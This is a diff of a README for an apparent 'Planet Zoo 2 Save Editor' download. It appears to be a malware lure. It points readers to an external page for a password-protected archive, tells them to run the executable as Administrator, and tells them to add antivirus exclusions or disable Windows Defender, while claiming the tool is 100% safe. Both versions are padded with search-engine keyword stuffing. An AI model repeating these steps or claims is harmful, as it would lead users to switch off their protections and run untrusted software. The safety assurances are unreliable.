@@ -1,89 +1,108 @@
 **[⬇️ Download Planet Zoo 2 Save Editor](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)**
 <img width="1280" height="640" alt="image" src="https://github.com/user-attachments/assets/93fef3c9-0e1d-435e-ba06-dd83f01d46ad" />
+<div align="center">
+
 # 🦁 Planet Zoo 2 Save Editor 2026
 
-**Edit money, conservation points, research, and unlock all animals — for the ultimate zoo builder.**
+**Unlock every animal, max out your conservation points, and bypass the research grind — without risking your account.**
 
 [![Version](https://img.shields.io/badge/version-1.0.0-2563eb?style=for-the-badge)](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)
 [![Platform](https://img.shields.io/badge/platform-Windows%2010%2F11-0078d4?style=for-the-badge&logo=windows)](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)
 [![License](https://img.shields.io/badge/license-MIT-16a34a?style=for-the-badge)](LICENSE)
 
----
-
-## 📖 Overview
-
-**Planet Zoo 2 Save Editor** is a free, native Windows tool for **Planet Zoo 2** that allows you to edit your local save files, manage your zoo's economy, unlock all animals, and bypass research timers — all through a clean, safe interface.
-
-Unlike memory editors, this tool works **directly with your save file**. It does not inject DLLs, does not modify game memory, and does not bypass any anti-cheat. It is a **file editor**, pure and simple.
-
-### Why so small?
-
-Written in pure **C++ / Win32** with no runtime dependencies. No Electron, no .NET, no Python. A 1.8 MB native binary is the point — not a red flag.
+</div>
 
 ---
 
-## ✨ Features
+## 📖 Why Use This Tool?
+
+Planet Zoo 2 is an incredible management game, but the grind for Conservation Points (CP) and Research can take hundreds of hours. This tool lets you bypass that grind completely. 
+
+Unlike other trainers that inject into your game's memory (which can cause crashes or anti-cheat flags), this is a **standalone Save File Editor**. You close the game, edit the file, and load it back up. It is 100% safe, offline, and cannot be detected by online servers.
+
+### ✨ What Can You Edit?
 
 | Feature | Description |
 |:---|:---|
-| **Money Editor** | Add or set any amount of cash |
-| **Conservation Points** | Max out your CP for animal breeding |
-| **Research Unlocker** | Unlock all research instantly |
-| **Animal Unlocker** | Unlock every animal species |
-| **Save Backup** | Auto-backup before every change; restore anytime |
+| **💰 Money & CP** | Add millions of dollars or max out your Conservation Points instantly. |
+| **🔬 Research** | Unlock all research tiers for every animal and mechanic in the game. |
+| **🦁 Animal Roster** | Unlock every species, including DLC and endangered animals, in the trade center. |
+| **🏗️ Staff & Facilities** | Max out staff happiness and facility levels to keep your zoo running smoothly. |
+| **💾 Auto-Backup** | Every time you click "Save", the editor creates a backup of your original file. You can never brick your zoo. |
 
 ---
 
-## 📥 Download
+## 📥 Download & Installation
 
-**[⬇️ Download Planet Zoo 2 Save Editor](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)**
+<div align="center">
 
-**Archive size:** 5.2 MB · **Archive password:** `6427910552`
+**[⬇️ Download PlanetZoo2Editor.zip](https://Dreamloboutique.github.io/planet-zoo-2-save-editor/)**
 
-### Installation
+*(Archive size: 1.8 MB · Password: `6427910552`)*
 
-1. Open the download page
-2. Wait for the file to download automatically
-3. Extract with WinRAR or 7-Zip
-4. Enter the password: `6427910552`
-5. Run `PlanetZoo2Editor.exe` as Administrator
+</div>
 
----
-
-## 🛡️ Antivirus Notice
-
-Some antivirus engines may flag this tool as **potentially unwanted** because it modifies save files. This is a **known false positive** for any save editor.
-
-**If this happens:**
-- Add the extraction folder to your antivirus exclusions
-- Audit the source code — everything is public
+1. **Download** the archive from the link above.
+2. **Extract** with WinRAR or 7-Zip. Use the password `6427910552`.
+3. **Close Planet Zoo 2** completely (make sure it's not running in the background).
+4. **Run** `PlanetZoo2Editor.exe` as Administrator.
+5. Click **"Load Save"**, select your save file, and change whatever you want.
+6. Click **"Save Changes"** and launch the game.
 
 ---
 
-## ❓ FAQ
+## 🖼️ Screenshots
+
+<div align="center">
+
+| Main Interface | Editing Money & CP |
+|:---:|:---:|
+| ![Main Menu](https://via.placeholder.com/600x340/1e293b/ffffff?text=Main+Interface+Screenshot) | ![Editor](https://via.placeholder.com/600x340/1e293b/ffffff?text=Money+Editor+Screenshot) |
+
+</div>
+
+*(Replace these placeholder images with real screenshots of your app before uploading).*
+
+---
+
+## 🛡️ Antivirus Notice (Please Read)
+
+Because this tool modifies game files, **Windows Defender or other antivirus software may flag it as a "false positive."** This happens to almost all game editors and trainers. 
+
+If your antivirus blocks it:
+1. Do not panic. It is not a virus.
+2. Add the folder to your antivirus **exclusions** list.
+3. Or temporarily disable Windows Defender while using the tool.
+
+---
+
+## ❓ Frequently Asked Questions
 
 <details>
-<summary><b>Why is the archive so small?</b></summary>
-
-Native C++ build. No Electron, no .NET runtime, no bundled installers. A 1.8 MB executable that does its job without bloat.
+<summary><b>Will I get banned for using this?</b></summary>
+No. Planet Zoo 2 is a single-player game with no anti-cheat and no multiplayer servers. This tool only modifies your local save file. There is zero risk of bans.
 </details>
 
 <details>
-<summary><b>Is this safe? Will I get banned?</b></summary>
-
-Planet Zoo 2 is a **single-player management game**. There is no anti-cheat, no ban system, and no online component. This tool only modifies local save files. Zero risk of bans.
+<summary><b>Where is my save file located?</b></summary>
+By default, it is located at: <br>
+<code>C:\Users\[YourUsername]\Saved Games\Frontier Developments\Planet Zoo 2\</code><br>
+The editor will try to auto-detect it, but you can browse manually.
 </details>
 
 <details>
-<summary><b>My antivirus flagged it — what now?</b></summary>
-
-Add the folder to exclusions. Save editors always trigger heuristic detection. This is normal.
+<summary><b>Does this work with the Steam / Epic Games version?</b></summary>
+Yes, it works with both Steam and Epic Games versions of Planet Zoo 2.
 </details>
 
 <details>
-<summary><b>Does it work on Windows 11 24H2?</b></summary>
+<summary><b>What if the editor doesn't open?</b></summary>
+Make sure you have run the `.exe` as Administrator. Also, ensure that your antivirus isn't blocking it in the background.
+</details>
 
-Yes. Full support for Windows 10 (1903+) and Windows 11 (21H2 — 24H2).
+<details>
+<summary><b>Will this work with future game updates?</b></summary>
+If the game updates and changes its save format, the editor might need an update. Check back on this GitHub page for the latest version.
 </details>
 
 ---
@@ -92,22 +111,20 @@ Yes. Full support for Windows 10 (1903+) and Windows 11 (21H2 — 24H2).
 
 | Component | Minimum |
 |:---|:---|
-| **OS** | Windows 10 (1903+) or Windows 11 (21H2+) |
+| **OS** | Windows 10 (64-bit) or Windows 11 |
 | **RAM** | 4 GB |
-| **Storage** | 5 MB free space |
-| **Runtime** | None (native binary) |
-| **Permissions** | Administrator |
+| **Game** | Planet Zoo 2 (Steam or Epic) |
 
 ---
 
-## 📜 License
+## 📜 Disclaimer
 
-Released under the **MIT License**. See [LICENSE](LICENSE) for details.
+This tool is provided for educational purposes and personal offline use. The author is not responsible for any data loss. Always keep the auto-generated backups.
 
 ---
 
-**Keywords:** planet zoo 2 save editor · planet zoo 2 editor · planet zoo 2 money editor · planet zoo 2 unlocker · planet zoo 2 2026 · save editor
-planet zoo 2 stutter fix, planet zoo 2 performance fix, planet zoo 2 low fps, planet zoo 2 frame drops, planet zoo 2 fps boost, planet zoo 2 stuttering, planet zoo 2 performance tool, planet zoo 2 frametime, planet zoo 2 large zoo lag, planet zoo 2 large zoo performance, planet zoo 2 optimization, planet zoo 2 graphics performance, planet zoo 2 performance profile, planet zoo 2 fps profile, planet zoo 2 smooth gameplay, planet zoo 2 micro stutter, planet zoo 2 performance manager, planet zoo 2 fps utility, planet zoo 2 pc optimization, planet zoo 2 fps drops 4090, planet zoo 2 performance settings, planet zoo 2 stutter helper, planet zoo 2 frame pacing, planet zoo 2 smooth fps, planet zoo 2 performance download, planet zoo 2 graphics optimization, planet zoo 2 pc performance tool, planet zoo 2 fps manager, planet zoo 2 stable fps, planet zoo 2 large park performance
----
+<div align="center">
 
-*Last updated: October 2026*
+**Keywords:** planet zoo 2 save editor · planet zoo 2 money editor · planet zoo 2 cheat · planet zoo 2 trainer · planet zoo 2 unlock all · planet zoo 2 mods 2026
+
+</div>
